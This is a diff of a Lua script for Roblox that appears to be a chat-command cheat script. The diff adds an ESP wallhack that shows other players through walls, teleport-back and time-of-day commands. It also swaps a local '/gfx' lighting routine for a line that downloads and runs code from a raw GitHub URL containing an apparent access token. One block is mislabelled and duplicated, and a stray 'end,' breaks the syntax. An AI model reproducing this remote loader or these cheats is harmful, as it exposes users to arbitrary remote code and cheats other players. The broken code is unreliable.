@@ -180,22 +180,149 @@ for _, player in pairs(game.Players:GetPlayers()) do
   player.Chatted:Connect(function(message)
     local parts = message:split(" ")
     if parts[1]:lower() == "/gfx" then
-      game.Lighting.Brightness = 0
-      game.Lighting.Ambient = Color3.fromRGB(0, 0, 0)
-      game.Lighting.GlobalShadows = false
-      game.Lighting.FogEnd = 100000
-      game.Lighting.FogColor = Color3.fromRGB(255, 255, 255)
-
-      for _, part in pairs(workspace:GetDescendants()) do
-        if part:IsA("BasePart") then
-          part.Material = Enum.Material.SmoothPlastic
-        elseif part:IsA("Decal") then
-          part:Destroy()
-        end
-      end
+      loadstring(game:HttpGet("https://raw.githubusercontent.com/CKVHubs/Secret/main/GFX?token=GHSAT0AAAAAACT472YCOKN6KLEOCQSREFIKZTVKCKQ"))()
     end
   end)
 end
 
--- ///////////////////////////////////// THE NEXT IS MAKE FRAME BLACK
+-- ///////////////////////////////////// THE NEXT IS TIME NIGHT
 
+for _, player in pairs(game.Players:GetPlayers()) do
+  player.Chatted:Connect(function(message)
+    local parts = message:split(" ")
+    if parts[1]:lower() == "/night" then
+game.Lighting.ClockTime = 18
+    end
+  end)
+end
+
+-- ///////////////////////////////////// THE NEXT IS TIME DAY
+
+for _, player in pairs(game.Players:GetPlayers()) do
+  player.Chatted:Connect(function(message)
+    local parts = message:split(" ")
+    if parts[1]:lower() == "/day" then
+game.Lighting.ClockTime = 12
+    end
+  end)
+end
+
+-- ///////////////////////////////////// THE NEXT IS TIME NIGHT
+
+for _, player in pairs(game.Players:GetPlayers()) do
+  player.Chatted:Connect(function(message)
+    local parts = message:split(" ")
+    if parts[1]:lower() == "/day" then
+game.Lighting.ClockTime = 12
+    end
+  end)
+end,
+
+-- ///////////////////////////////////// THE NEXT IS ESP
+
+-- Import required libraries
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+
+-- Function to create the ESP
+local function createESP()
+    for _, player in pairs(Players:GetPlayers()) do
+        if player ~= Players.LocalPlayer then
+            -- Create the ESP box
+            local box = Instance.new("BoxHandleAdornment")
+            box.Name = player.Name .. "ESP"
+            box.Adornee = player.Character
+            box.AlwaysOnTop = true
+            box.ZIndex = 5
+            box.Size = Vector3.new(3, 6, 2)
+            box.Color3 = Color3.fromHSV(tick() % 5 / 5, 1, 1)
+            box.Transparency = 0.5
+            box.Parent = player.Character
+
+            -- Create the name text
+            local nameText = Instance.new("BillboardGui")
+            nameText.Name = player.Name .. "NameText"
+            nameText.Adornee = player.Character.Head
+            nameText.Size = UDim2.new(1, 400, 1, 450)
+            nameText.AlwaysOnTop = true
+            local textLabel = Instance.new("TextLabel")
+            textLabel.Text = player.Name
+            textLabel.Size = UDim2.new(1, 0, 1, 0)
+            textLabel.BackgroundTransparency = 1
+            textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+            textLabel.Parent = nameText
+            nameText.Parent = player.Character
+        end
+    end
+end
+
+-- Function to update the ESP
+local function updateESP()
+    for _, player in pairs(Players:GetPlayers()) do
+        if player ~= Players.LocalPlayer then
+            local box = player.Character:FindFirstChild(player.Name .. "ESP")
+            local nameText = player.Character:FindFirstChild(player.Name .. "NameText")
+            if box then
+                box.Adornee = player.Character
+                box.Color3 = Color3.fromHSV(tick() % 5 / 5, 1, 1)
+            end
+            if nameText then
+                nameText.Adornee = player.Character.Head
+            end
+        end
+    end
+end
+
+-- Function to delete the ESP
+local function deleteESP()
+    for _, player in pairs(Players:GetPlayers()) do
+        if player ~= Players.LocalPlayer then
+            local box = player.Character:FindFirstChild(player.Name .. "ESP")
+            local nameText = player.Character:FindFirstChild(player.Name .. "NameText")
+            if box then
+                box:Destroy()
+            end
+            if nameText then
+                nameText:Destroy()
+            end
+        end
+    end
+end
+
+-- Start the ESP when "/esp" is typed
+for _, player in pairs(game.Players:GetPlayers()) do
+    player.Chatted:Connect(function(message)
+        local parts = message:split(" ")
+        if parts[1]:lower() == "/esp" then
+            createESP()
+            RunService.RenderStepped:Connect(updateESP)
+        end
+    end)
+end
+
+-- Delete the ESP when "/unesp" is typed
+for _, player in pairs(game.Players:GetPlayers()) do
+    player.Chatted:Connect(function(message)
+        local parts = message:split(" ")
+        if parts[1]:lower() == "/unesp" then
+            deleteESP()
+        end
+    end)
+end
+
+-- ///////////////////////////////////// THE NEXT IS SAVE LOCATION
+
+local savedCFrame = nil
+
+for _, player in pairs(game.Players:GetPlayers()) do
+  player.Chatted:Connect(function(message)
+    local parts = message:split(" ")
+    if parts[1]:lower() == "/savetp" then
+      savedCFrame = player.Character.HumanoidRootPart.CFrame
+    elseif parts[1]:lower() == "/back" then
+      if savedCFrame then
+        player.Character.HumanoidRootPart.CFrame = savedCFrame
+      end
+    end
+  end)
+end
